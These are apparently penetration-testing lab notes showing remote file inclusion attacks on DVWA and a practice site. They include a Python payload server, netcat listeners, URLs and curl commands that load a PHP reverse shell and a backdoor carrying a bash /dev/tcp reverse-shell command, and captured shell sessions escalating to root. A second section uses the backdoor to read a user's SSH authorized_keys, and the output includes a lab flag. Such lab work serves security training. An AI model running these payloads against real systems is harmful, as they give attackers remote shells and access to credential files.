RFI (This can be done only if the dvwa-vulnerabilities.sh script is ran first):

1. Start a Python3 HTTP Server and a NC Listener:
┌──(kali㉿kali)-[/var/www/html/DVWA/config]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

┌──(kali㉿kali)-[/var/www/html/DVWA/config]
└─$ nc -nvlp 1234


2. php-reverse-shell
http://dvwa.local/DVWA/vulnerabilities/fi/?page=http://192.168.48.128:8000/php-reverse-shell.php
or
┌──(kali㉿kali)-[~]
└─$ curl -I -b "PHPSESSID=be6227281c27ad618bed6fd14894f887; security=low" "http://dvwa.local/DVWA/vulnerabilities/fi/?page=http://192.168.48.128:8000/php-reverse-shell.php"
HTTP/1.1 200 OK
Date: Mon, 26 May 2025 04:14:34 GMT
Server: Apache/2.4.63 (Debian)
Expires: Tue, 23 Jun 2009 12:00:00 GMT
Cache-Control: no-cache, must-revalidate
Pragma: no-cache
Content-Type: text/html;charset=utf-8

┌──(kali㉿kali)-[~]
└─$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.48.128] from (UNKNOWN) [192.168.48.1] 8810
Linux wsl 5.15.167.4-microsoft-standard-WSL2 #1 SMP Tue Nov 5 00:21:55 UTC 2024 x86_64 GNU/Linux
 18:17:45 up  1:30,  2 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
kali     pts/1    -                16:47    1:30m  0.00s   ?    -bash
kali              -                16:47    1:30m  0.00s  0.03s /usr/lib/systemd/systemd --user
uid=33(www-data) gid=33(www-data) groups=33(www-data),4(adm)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/sh")'
$ su hacker
su hacker
root@wsl:/# 


3. simple-backdoor.php
http://dvwa.local/DVWA/vulnerabilities/fi/?page=http://192.168.48.128:8000/simple-backdoor.php&cmd=bash+-c+%27bash+-i+%3E%26+/dev/tcp/192.168.48.128/1234+0%3E%261%27
or
┌──(kali㉿kali)-[~]
└─$ curl -I -b "PHPSESSID=be6227281c27ad618bed6fd14894f887; security=low" "http://dvwa.local/DVWA/vulnerabilities/fi/?page=http://192.168.48.128:8000/simple-backdoor.php&cmd=bash+-c+'bash+-i+%3E%26+/dev/tcp/192.168.48.128/1234+0%3E%261'"
HTTP/1.1 200 OK
Date: Mon, 26 May 2025 04:19:45 GMT
Server: Apache/2.4.63 (Debian)
Expires: Tue, 23 Jun 2009 12:00:00 GMT
Cache-Control: no-cache, must-revalidate
Pragma: no-cache
Content-Type: text/html;charset=utf-8

┌──(kali㉿kali)-[~]
└─$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.48.128] from (UNKNOWN) [192.168.48.1] 8744
bash: cannot set terminal process group (2658): Inappropriate ioctl for device
bash: no job control in this shell
www-data@wsl:/var/www/html/DVWA/vulnerabilities/fi$ python3 -c 'import pty; pty.spawn("/bin/sh")'
<s/fi$ python3 -c 'import pty; pty.spawn("/bin/sh")'       
$ su hacker
su hacker
root@wsl:/var/www/html/DVWA/vulnerabilities/fi# 


-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Remote File Inclusion (SSH Public Key):

┌──(kali㉿kali)-[~]
└─$ curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.166/simple-backdoor.php&cmd=cat%20/home/elaine/.ssh/authorized_keys"
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <title>Delicious Desserts from the Mountains</title>
<!--
Template 2089 Meteor
http://www.tooplate.com/view/2089-meteor
-->
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="apple-touch-icon" href="apple-touch-icon.png">
        <link rel="stylesheet" href="css/bootstrap.min.css">
        <link rel="stylesheet" href="css/bootstrap-theme.min.css">
        <link rel="stylesheet" href="css/fontAwesome.css">
        <link rel="stylesheet" href="css/hero-slider.css">
        <link rel="stylesheet" href="css/tooplate-style.css">
        <script src="js/vendor/modernizr-2.8.3-respond-1.4.2.min.js"></script>
    </head>
<body>
    <div class="header">
        <div class="container">
            <nav class="navbar navbar-inverse" role="navigation">
                <div class="navbar-header">
                    <button type="button" id="nav-toggle" class="navbar-toggle" data-toggle="collapse" data-target="#main-nav">
                        <span class="sr-only">Toggle navigation</span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </button>
                    <a href="#" class="navbar-brand scroll-top">
                        <div>Mountain Desserts</div>
                    </a>
                </div>
                <!--/.navbar-header-->
                <div id="main-nav" class="collapse navbar-collapse">
                    <ul class="nav navbar-nav">
                        <li><a href="#" class="scroll-top">Home</a></li>
                    </ul>
                </div>
                <!--/.navbar-collapse-->
            </nav>
            <!--/.navbar-->
        </div>
        <!--/.container-->
    </div>
    <!--/.header-->
    <section class="cd-hero">
        <ul class="cd-hero-slider autoplay">  
            <li class="selected first-slide">
                <div class="cd-full-width">
                    <div class="tm-slide-content-div slide-caption">
                        <span>Introduction to</span>
                        <h2>Mountain Desserts</h2>
                        <p>We bring you the delicious desserts of the mountains on your table</p>
                        <div class="primary-button">
                            <a href="#" class="scroll-link" data-id="about">Discover More</a>
                        </div>                           
                    </div>                   
                </div> <!-- .cd-full-width -->
            </li>
        </ul> <!-- .cd-hero-slider -->
    </section> <!-- .cd-hero -->
    <div id="what-we-do">
        <div class="container">
            <div class="row">
                <div class="col-md-6">
                    <div class="left-text">
</br></br></br>
</br></br></br></br></br>
                        <h4>The Wolpertinger just brought us our newest recipes!</h4>
                        <ul>
                            <li>
                                <div class="white-button">
                                    <a href="#" class="scroll-link" data-id="portfolio">Discover More</a>
                                </div>
                            </li>
                            <li>
                                <div class="primary-button">
                                    <a href="#">Purchase Now</a>
                                </div>
                            </li>
                        </ul>
                    </div>
                </div>
                <div class="col-md-6">
                    <div class="right-image">
                        <img src="img/what-we-do-right-image.png" alt="">
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div id="fun-facts">
        <div class="container">
            <div class="row">
                <div class="col-md-3 col-sm-6 col-xs-12">
                    <div class="fact-item">
                        <div class="counter" data-count="926">0</div>
                        <span>Sold Mountain Desserts</span>
                    </div>
                </div>
                <div class="col-md-3 col-sm-6 col-xs-12">
                    <div class="fact-item">
                        <div class="counter" data-count="7">0</div>
                        <span>Recurring Customers</span>
                    </div>
                </div>
                <div class="col-md-3 col-sm-6 col-xs-12">
                    <div class="fact-item">
                        <div class="counter" data-count="1">0</div>
                        <span>Happy Clients</span>
                    </div>
                </div>
                <div class="col-md-3 col-sm-6 col-xs-12">
                    <div class="fact-item">
                        <div class="counter" data-count="16">0</div>
                        <span>Total Awards</span>
                    </div>
                </div>
            </div>
        </div>
    </div>
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
<pre>command = "OS{1ce270683c39e7f0496d86f39ac4ab05}" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOMAXqYDrvKuG0L+G20mS7ARlXSBnLd8sxCXCB2V/CHDftnyxwQMqkc7B14GncT4dUzd1iRmrxczF6ED45Yl8lhRXwJxDOtXLYInwA/9KVgFU5ncDdooIgWe//5HW0yZDBCsKiw2IpoxfGskRMeUufiPW7x+pG/RL6wbf3YLila1cT1o/XTuESVX8DFWQEa5Lq21F7LDmoEGfUQFqf33bWA5Cy4KrUfWmiSZrlC0y2nk6qJVIDJHAmhReM2DRYjNyxKb/B5kNE7yj94kh9EmYWffAN/rlFk1JWk7gCjClp/fdpsTIANFFsyfZ0ADMpknYURWY4Urjlm7XZ+OTjx+Sn4gnQq8+/wPi4ypqKL403OMecFGhnsvI20Pefq+c44K+R52igJAEQA7z3Jv74lPUO5F9PVXyOg6N46e2j/3UCyfYKaJncfB0Zc55BU1nQKFS2SjjTvTAD7Lhg0F1q0HKbM4z12ph8OzzzMvLoOYwujt/etKXm9qMLOwMcgfA+R0k= elaine@tri-island
</pre>
